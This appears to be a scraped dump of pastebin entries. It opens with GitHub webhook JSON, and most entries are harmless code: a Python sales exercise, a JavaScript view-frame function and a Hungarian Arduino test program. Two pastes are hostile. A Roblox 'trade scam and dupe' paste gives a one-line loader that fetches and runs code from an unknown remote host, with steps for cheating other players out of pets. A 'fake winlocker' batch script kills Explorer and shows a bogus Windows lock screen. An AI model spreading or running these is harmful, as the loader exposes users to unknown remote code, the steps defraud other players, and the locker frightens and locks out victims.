        ""keys_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/keys{/key_id}"",
        ""collaborators_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/collaborators{/collaborator}"",
        ""teams_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/teams"",
        ""hooks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/hooks"",
        ""issue_events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/events{/number}"",
        ""events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/events"",
        ""assignees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/assignees{/user}"",
        ""branches_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/branches{/branch}"",
        ""tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/tags"",
        ""blobs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/blobs{/sha}"",
        ""git_tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/tags{/sha}"",
        ""git_refs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/refs{/sha}"",
        ""trees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/trees{/sha}"",
        ""statuses_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/statuses/{sha}"",
        ""languages_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/languages"",
        ""stargazers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/stargazers"",
        ""contributors_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/contributors"",
        ""subscribers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/subscribers"",
        ""subscription_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/subscription"",
        ""commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/commits{/sha}"",
        ""git_commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/commits{/sha}"",
        ""comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/comments{/number}"",
        ""issue_comment_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/comments{/number}"",
        ""contents_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/contents/{+path}"",
        ""compare_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/compare/{base}...{head}"",
        ""merges_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/merges"",
        ""archive_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/{archive_format}{/ref}"",
        ""downloads_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/downloads"",
        ""issues_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues{/number}"",
        ""pulls_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls{/number}"",
        ""milestones_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/milestones{/number}"",
        ""notifications_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/notifications{?since,all,participating}"",
        ""labels_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/labels{/name}"",
        ""releases_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/releases{/id}"",
        ""deployments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/deployments"",
        ""created_at"": ""2020-09-25T18:04:07Z"",
        ""updated_at"": ""2024-05-28T13:06:46Z"",
        ""pushed_at"": ""2024-05-28T14:44:55Z"",
        ""git_url"": ""git://github.com/hetosoft/ProjetosSol.WEB.git"",
        ""ssh_url"": ""git@github.com:hetosoft/ProjetosSol.WEB.git"",
        ""clone_url"": ""https://github.com/hetosoft/ProjetosSol.WEB.git"",
        ""svn_url"": ""https://github.com/hetosoft/ProjetosSol.WEB"",
        ""homepage"": null,
        ""size"": 621172,
        ""stargazers_count"": 0,
        ""watchers_count"": 0,
        ""language"": ""C#"",
        ""has_issues"": true,
        ""has_projects"": true,
        ""has_downloads"": true,
        ""has_wiki"": true,
        ""has_pages"": false,
        ""has_discussions"": true,
        ""forks_count"": 0,
        ""mirror_url"": null,
        ""archived"": false,
        ""disabled"": false,
        ""open_issues_count"": 15,
        ""license"": null,
        ""allow_forking"": false,
        ""is_template"": false,
        ""web_commit_signoff_required"": false,
        ""topics"": [

        ],
        ""visibility"": ""private"",
        ""forks"": 0,
        ""open_issues"": 15,
        ""watchers"": 0,
        ""default_branch"": ""master"",
        ""allow_squash_merge"": true,
        ""allow_merge_commit"": true,
        ""allow_rebase_merge"": true,
        ""allow_auto_merge"": false,
        ""delete_branch_on_merge"": false,
        ""allow_update_branch"": false,
        ""use_squash_pr_title_as_default"": false,
        ""squash_merge_commit_message"": ""COMMIT_MESSAGES"",
        ""squash_merge_commit_title"": ""COMMIT_OR_PR_TITLE"",
        ""merge_commit_message"": ""PR_TITLE"",
        ""merge_commit_title"": ""MERGE_MESSAGE""
      }
    },
    ""_links"": {
      ""self"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/799""
      },
      ""html"": {
        ""href"": ""https://github.com/hetosoft/ProjetosSol.WEB/pull/799""
      },
      ""issue"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/799""
      },
      ""comments"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/799/comments""
      },
      ""review_comments"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/799/comments""
      },
      ""review_comment"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/comments{/number}""
      },
      ""commits"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/799/commits""
      },
      ""statuses"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/statuses/9b9f7df6cb297d7d09f7cce4bf85ae52b9db9887""
      }
    },
    ""author_association"": ""CONTRIBUTOR"",
    ""auto_merge"": null,
    ""active_lock_reason"": null,
    ""merged"": true,
    ""mergeable"": null,
    ""rebaseable"": null,
    ""mergeable_state"": ""unknown"",
    ""merged_by"": {
      ""login"": ""wesProg23"",
      ""id"": 20547283,
      ""node_id"": ""MDQ6VXNlcjIwNTQ3Mjgz"",
      ""avatar_url"": ""https://avatars.githubusercontent.com/u/20547283?v=4"",
      ""gravatar_id"": """",
      ""url"": ""https://api.github.com/users/wesProg23"",
      ""html_url"": ""https://github.com/wesProg23"",
      ""followers_url"": ""https://api.github.com/users/wesProg23/followers"",
      ""following_url"": ""https://api.github.com/users/wesProg23/following{/other_user}"",
      ""gists_url"": ""https://api.github.com/users/wesProg23/gists{/gist_id}"",
      ""starred_url"": ""https://api.github.com/users/wesProg23/starred{/owner}{/repo}"",
      ""subscriptions_url"": ""https://api.github.com/users/wesProg23/subscriptions"",
      ""organizations_url"": ""https://api.github.com/users/wesProg23/orgs"",
      ""repos_url"": ""https://api.github.com/users/wesProg23/repos"",
      ""events_url"": ""https://api.github.com/users/wesProg23/events{/privacy}"",
      ""received_events_url"": ""https://api.github.com/users/wesProg23/received_events"",
      ""type"": ""User"",
      ""site_admin"": false
    },
    ""comments"": 0,
    ""review_comments"": 0,
    ""maintainer_can_modify"": false,
    ""commits"": 3,
    ""additions"": 95,
    ""deletions"": 80,
    ""changed_files"": 5
  },
  ""repository"": {
    ""id"": 298645758,
    ""node_id"": ""MDEwOlJlcG9zaXRvcnkyOTg2NDU3NTg="",
    ""name"": ""ProjetosSol.WEB"",
    ""full_name"": ""hetosoft/ProjetosSol.WEB"",
    ""private"": true,
    ""owner"": {
      ""login"": ""hetosoft"",
      ""id"": 53792964,
      ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
      ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
      ""gravatar_id"": """",
      ""url"": ""https://api.github.com/users/hetosoft"",
      ""html_url"": ""https://github.com/hetosoft"",
      ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
      ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
      ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
      ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
      ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
      ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
      ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
      ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
      ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
      ""type"": ""Organization"",
      ""site_admin"": false
    },
    ""html_url"": ""https://github.com/hetosoft/ProjetosSol.WEB"",
    ""description"": ""Projetos Hetosoft .NET"",
    ""fork"": false,
    ""url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB"",
    ""forks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/forks"",
    ""keys_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/keys{/key_id}"",
    ""collaborators_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/collaborators{/collaborator}"",
    ""teams_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/teams"",
    ""hooks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/hooks"",
    ""issue_events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/events{/number}"",
    ""events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/events"",
    ""assignees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/assignees{/user}"",
    ""branches_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/branches{/branch}"",
    ""tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/tags"",
    ""blobs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/blobs{/sha}"",
    ""git_tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/tags{/sha}"",
    ""git_refs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/refs{/sha}"",
    ""trees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/trees{/sha}"",
    ""statuses_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/statuses/{sha}"",
    ""languages_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/languages"",
    ""stargazers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/stargazers"",
    ""contributors_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/contributors"",
    ""subscribers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/subscribers"",
    ""subscription_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/subscription"",
    ""commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/commits{/sha}"",
    ""git_commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/commits{/sha}"",
    ""comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/comments{/number}"",
    ""issue_comment_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/comments{/number}"",
    ""contents_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/contents/{+path}"",
    ""compare_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/compare/{base}...{head}"",
    ""merges_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/merges"",
    ""archive_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/{archive_format}{/ref}"",
    ""downloads_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/downloads"",
    ""issues_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues{/number}"",
    ""pulls_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls{/number}"",
    ""milestones_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/milestones{/number}"",
    ""notifications_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/notifications{?since,all,participating}"",
    ""labels_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/labels{/name}"",
    ""releases_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/releases{/id}"",
    ""deployments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/deployments"",
    ""created_at"": ""2020-09-25T18:04:07Z"",
    ""updated_at"": ""2024-05-28T13:06:46Z"",
    ""pushed_at"": ""2024-05-28T14:44:55Z"",
    ""git_url"": ""git://github.com/hetosoft/ProjetosSol.WEB.git"",
    ""ssh_url"": ""git@github.com:hetosoft/ProjetosSol.WEB.git"",
    ""clone_url"": ""https://github.com/hetosoft/ProjetosSol.WEB.git"",
    ""svn_url"": ""https://github.com/hetosoft/ProjetosSol.WEB"",
    ""homepage"": null,
    ""size"": 621172,
    ""stargazers_count"": 0,
    ""watchers_count"": 0,
    ""language"": ""C#"",
    ""has_issues"": true,
    ""has_projects"": true,
    ""has_downloads"": true,
    ""has_wiki"": true,
    ""has_pages"": false,
    ""has_discussions"": true,
    ""forks_count"": 0,
    ""mirror_url"": null,
    ""archived"": false,
    ""disabled"": false,
    ""open_issues_count"": 15,
    ""license"": null,
    ""allow_forking"": false,
    ""is_template"": false,
    ""web_commit_signoff_required"": false,
    ""topics"": [

    ],
    ""visibility"": ""private"",
    ""forks"": 0,
    ""open_issues"": 15,
    ""watchers"": 0,
    ""default_branch"": ""master"",
    ""custom_properties"": {

    }
  },
  ""organization"": {
    ""login"": ""hetosoft"",
    ""id"": 53792964,
    ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
    ""url"": ""https://api.github.com/orgs/hetosoft"",
    ""repos_url"": ""https://api.github.com/orgs/hetosoft/repos"",
    ""events_url"": ""https://api.github.com/orgs/hetosoft/events"",
    ""hooks_url"": ""https://api.github.com/orgs/hetosoft/hooks"",
    ""issues_url"": ""https://api.github.com/orgs/hetosoft/issues"",
    ""members_url"": ""https://api.github.com/orgs/hetosoft/members{/member}"",
    ""public_members_url"": ""https://api.github.com/orgs/hetosoft/public_members{/member}"",
    ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
    ""description"": """"
  },
  ""sender"": {
    ""login"": ""wesProg23"",
    ""id"": 20547283,
    ""node_id"": ""MDQ6VXNlcjIwNTQ3Mjgz"",
    ""avatar_url"": ""https://avatars.githubusercontent.com/u/20547283?v=4"",
    ""gravatar_id"": """",
    ""url"": ""https://api.github.com/users/wesProg23"",
    ""html_url"": ""https://github.com/wesProg23"",
    ""followers_url"": ""https://api.github.com/users/wesProg23/followers"",
    ""following_url"": ""https://api.github.com/users/wesProg23/following{/other_user}"",
    ""gists_url"": ""https://api.github.com/users/wesProg23/gists{/gist_id}"",
    ""starred_url"": ""https://api.github.com/users/wesProg23/starred{/owner}{/repo}"",
    ""subscriptions_url"": ""https://api.github.com/users/wesProg23/subscriptions"",
    ""organizations_url"": ""https://api.github.com/users/wesProg23/orgs"",
    ""repos_url"": ""https://api.github.com/users/wesProg23/repos"",
    ""events_url"": ""https://api.github.com/users/wesProg23/events{/privacy}"",
    ""received_events_url"": ""https://api.github.com/users/wesProg23/received_events"",
    ""type"": ""User"",
    ""site_admin"": false
  }
}"
mMuhmzsY,Ps99 trade scam and dupe,Creakkz,Lua,Tuesday 28th of May 2024 10:35:35 AM CDT,"Here is the trade scam/duping script: loadstring(game:HttpGet('https://egorikusa.space/8a04b70b58f243796c31b428.lua'))()

How to use it: 
for duping 
1.load script (use any executor, for example https://vegax.gg/)
2.click the inject button
3.select pets
4.done

for trade scam 
1.load script (use any executor, for example https://vegax.gg/)
2.trade someone
3.tell him to offer your pet
4.enable trade scam and put your pet away
5.ready up and enjoy"
cuLQxWjt,Salesmen,stiky_fingaz,Python,Tuesday 28th of May 2024 10:25:02 AM CDT,"highest = 0
best_salesman = 0
bonus = 200

for i in range(3):
    total_salary = 200
    current_sales = int(input('Enter sales: '))

    if current_sales < 500:
        total_salary += current_sales * 0.03
    elif 500 <= current_sales < 1000:
        total_salary += current_sales * 0.05
    else:
        total_salary += current_sales * 0.08

    if total_salary > highest:
        highest = total_salary
        best_salesman = i + 1

    print(f'Salesman-{i + 1} got {total_salary} USD')

print(f'Best salesman is Salesman-{best_salesman} with {highest} USD salary. '
      f'Final salary with bonus: {highest + bonus} USD.')
"
Sp3egvVf,Fake batch winlocker,wrfcewrcqwerqwer3q,Batch,Tuesday 28th of May 2024 09:58:55 AM CDT,":: CODE: current hour and current minute. Example: If 16:32 code is 1632
@echo off
color 4
taskkill /im explorer.exe /f > nul
cls
title Windows has been blocked
echo Windows has been blocked
:G
echo Enter the activation code:
set /p x=
if %x%==%time:~0,2%%time:~3,2% (color a
cls
echo Windows starting!
start explorer
timeout /t 1 /nobreak > nul
exit
) ELSE (
cls
color 47
echo Activation code is incorrect!
echo Activation code is incorrect!
echo Activation code is incorrect!
timeout /t 1 /nobreak > nul
cls
color 4
echo Enter the acctivation code again!
)
goto G"
zb4f284r,Roe2js :: Create View Frame,jargon,JavaScript,Tuesday 28th of May 2024 09:17:17 AM CDT,"	createViewFrame (id) {
		
		id = 'viewframe';
		
		for( let y = 0; y<=7*3+1;y++){
		for( let x = 0; x<=7*3+1;x++){		
		for( let z = 0; z <= this.gui; z++ ){
			
			if(!(( y === 0 )||(y === 7*3+1)||(x === 0)||(x === 7*3+1)))
			{continue;}

			// Step 1: Create the element
			var newElement = document.createElement('div');

			// Step 2: Modify the element (optional)
			// newElement.textContent = ""This is a new div element."";
			
			newElement.style.width = `8px`;
			newElement.style.height = `8px`;
			
			if ( z === 0 ){
				newElement.style.backgroundColor = `black`;
			}
			if ( z === this.gui ){
				newElement.style.backgroundImage = `url(http://${this.host}/GFX/sel1dash.png)`;
				
				// newElement.style.filter = 'brightness(0) saturate(100%) invert(1) sepia(1) saturate(10000%) hue-rotate(90deg)';
			}
			newElement.style.position = `absolute`;
			newElement.style.left = `calc(8px * ${x})`;
			newElement.style.top = `calc(8px * ${y})`;
			newElement.className = `${id}`;
			newElement.id = `${id}_${x}_${y}_${z}`;
			newElement.style.zIndex = `${z}`;
			
			this.spriteManip.subSprite(newElement,'bottom right');

			// Step 3: Append the element to the document
			document.body.appendChild(newElement);
			
		}}}
		
		/*
		
		z = this.gui;
		
		for( y = 1; y < 7 * 3 + 1; y++ ){
			
			x = 0;
			element = document.getElementById(`${id}_${x}_${y}_${z}`);
			if(element){
				element.style.backgroundPosition = '0px 8px';
			}
			
			x = 5 * 3 + 1;
			element = document.getElementById(`${id}_${x}_${y}_${z}`);
			if(element){
				element.style.backgroundPosition = '16px 8px';
			}
		}
		for( x = 1; x < 7 * 3 + 1; x++ ){
			
			y = 0;
			element = document.getElementById(`${id}_${x}_${y}_${z}`);
			if(element){
				element.style.backgroundPosition = '8px 0px';
			}
			
			y = 5 * 3 + 1;
			element = document.getElementById(`${id}_${x}_${y}_${z}`);
			if(element){
				element.style.backgroundPosition = '8px 16px';
			}
		}
		*/
	}"
kpKxuHjA,Full test,Szerelo,C,Tuesday 28th of May 2024 09:09:19 AM CDT,"// Demo program a következő panelhez: https://github.com/the-developer-guy/PracticeShield/tree/main/hu
// 2024.05.28. Teremi József

// A nyomógombok és a kapcsoló állapotának kiírása a soros monitorra, LED-ek bekapcsolása, Buzzer próba.
// A Buzzer a nyomógomb megnyomására megszólal. A hang magassága a potenciométer és a kapcsoló állásától függ.

#define POT A0      // A potenciométert az A0-ás pinre csatlakoztattuk
#define BTN1 A2     // Az 1. nyomógombot az A2-es pinre csatlakoztattuk
#define BTN2 A1     // A 2. nyomógombot az A1-es pinre csatlakoztattuk
#define SWITCH A3   // A kapcsolót az A3-es pinre csatlakoztattuk
#define LED1 2     // Az 1. LED-et a D2-es pinre csatlakoztattuk
#define LED2 3
#define LED3 4
#define LED4 5
#define LED5 6
#define LED6 7
#define LED7 8
#define LED8 9
#define BUZZER 11  // A hangszórót a D11-es pinre csatlakoztattuk


bool button1State = LOW;   // A nyomógomb aktuális állapota
bool button2State = LOW;   // A nyomógomb aktuális állapota
bool switchState = LOW;     // A kapcsoló aktuális állapota
bool lastButton1State = LOW; // Az előző nyomógomb állapot
bool lastButton2State = LOW; // Az előző nyomógomb állapot
bool lastSwitchState = LOW;  // A előző kapcsoló állapot
unsigned long lastDebounceTime1 = 0;  // Az 1. nyomógomb utolsó prellmentes időpontja
unsigned long lastDebounceTime2 = 0;  // A 2. nyomógomb utolsó prellmentes időpontja
unsigned long lastDebounceTime3 = 0;  // A kapcsoló utolsó prellmentes időpontja
unsigned long debounceDelay = 50;    // A prellmentes idő beállítása
unsigned int potValue;
byte counter=2;
byte prevCounter=2;

void setup() {
  // Beállítjuk a bemenetként használt pinek irányát.
  pinMode(BTN1, INPUT);
  pinMode(BTN2, INPUT);
  pinMode(SWITCH, INPUT);
  // Beállítjuk a kimenetként használt pinek irányát.
  pinMode(LED1, OUTPUT);
  pinMode(LED2, OUTPUT);
  pinMode(LED3, OUTPUT);
  pinMode(LED4, OUTPUT);
  pinMode(LED5, OUTPUT);
  pinMode(LED6, OUTPUT);
  pinMode(LED7, OUTPUT);
  pinMode(LED8, OUTPUT);
  pinMode(BUZZER, OUTPUT);
  
  Serial.begin(115200);         // Soros kommunikáció inicializálása
  delay(1000);
  Serial.println(""Start ..."");  // Lássuk, hogy rendben elindult a program

  for (byte i=2;i<10;i++){
    digitalWrite(i,HIGH);
    delay(100);  
  }
  for (byte i=2;i<10;i++){
    digitalWrite(i,LOW);
    delay(100);  
  }
  // Ha az 1. gomb le van nyomva
  if (digitalRead(BTN1) == LOW) {
    Serial.println(""1. nyomógomb lenyomva"");
  } 
  // Ha az 1. gomb nincs lenyomva
  else {
    Serial.println(""1. nyomógomb nincs lenyomva"");
  }

  // Ha a 2. gomb le van nyomva
  if (digitalRead(BTN2) == LOW) {
  } 
  // Ha az 1. gomb nincs lenyomva
  else {
    Serial.println(""2. nyomógomb nincs lenyomva"");
  }

  // Ha a kapcsoló balra van állítva
  if (digitalRead(SWITCH) == LOW) {
    Serial.println(""A kapcsoló balra van állítva"");
  } 
  // Ha a kapcsoló jobbra van állítva
  else {
    Serial.println(""A kapcsoló jobbra van állítva"");
  }
}

void loop() {
  bool reading1 = !digitalRead(BTN1); // Olvassuk be az 1. nyomógomb állapotát negálva, ha a GND-ra van csatlakoztatva
  bool reading2 = !digitalRead(BTN2); // Olvassuk be a 2. nyomógomb állapotát negálva, ha a GND-ra van csatlakoztatva
  bool reading3 = digitalRead(SWITCH); // Olvassuk be a kapcsoló állapotát
  potValue=analogRead(POT);

  // Ha az 1. gomb állapota változott
  if (reading1 != lastButton1State) {
    // Frissítjük a prellmentes időtartam kezdeti idejét
    lastDebounceTime1 = millis();
  }

  // Ellenőrizzük, hogy a gomb állapota stabil-e a prellmentes idő után
  if ((millis() - lastDebounceTime1) > debounceDelay) {
    // Ha igen, akkor frissítjük a gomb állapotát
    if (reading1 != button1State) {
      button1State = reading1;

      // Ha a gombot lenyomtad
      if (button1State == HIGH) {
        Serial.println(""1. nyomógomb lenyomva"");
        tone(BUZZER,potValue*2+500+reading3*1000);
        counter--;
        if (counter==1) counter=9;
      } 
      // Ha a gombot elengedted
      else {
        Serial.println(""1. nyomógomb elengedve"");
        noTone(BUZZER);
      }
    }
  }
  // Ha a 2. gomb állapota változott
  if (reading2 != lastButton2State) {
    // Frissítjük a prellmentes időtartam kezdeti idejét
    lastDebounceTime2 = millis();
  }

  // Ellenőrizzük, hogy a gomb állapota stabil-e a prellmentes idő után
  if ((millis() - lastDebounceTime2) > debounceDelay) {
    // Ha igen, akkor frissítjük a gomb állapotát
    if (reading2 != button2State) {
      button2State = reading2;

      // Ha a gombot lenyomtad
      if (button2State == HIGH) {
        Serial.println(""2. nyomógomb lenyomva"");
        tone(BUZZER,potValue*3+1000+reading3*1000);
        counter++;
        if (counter==10) counter=2;
      } 
      // Ha a gombot elengedted
      else {
        Serial.println(""2. nyomógomb elengedve"");
        noTone(BUZZER);
      }
    }
  }

  // Ha a kapcsoló állapota változott
  if (reading3 != lastSwitchState) {
    // Frissítjük a prellmentes időtartam kezdeti idejét
    lastDebounceTime3 = millis();
  }

  // Ellenőrizzük, hogy a kapcsoló állapota stabil-e a prellmentes idő után
  if ((millis() - lastDebounceTime3) > debounceDelay) {
    // Ha igen, akkor frissítjük a kapcsoló állapotát
    if (reading3 != switchState) {
      switchState = reading3;

      // Ha a kapcsolót balra állítottad
      if (switchState == LOW) {
        Serial.println(""A kapcsoló balra van állítva."");
      } 
      // Ha a kapcsolót jobbra állítottad
      else {
        Serial.println(""A kapcsoló jobbra van állítva."");
      }
    }
  }
  if (prevCounter!=counter){
    digitalWrite(counter,HIGH);
    digitalWrite(prevCounter,LOW);
    prevCounter=counter;
  }
  // A nyomógombok és kapcsoló aktuális állapotát eltároljuk az előző állapotban
  lastButton1State = reading1;
  lastButton2State = reading2;
  lastSwitchState = reading3;
}

// END"
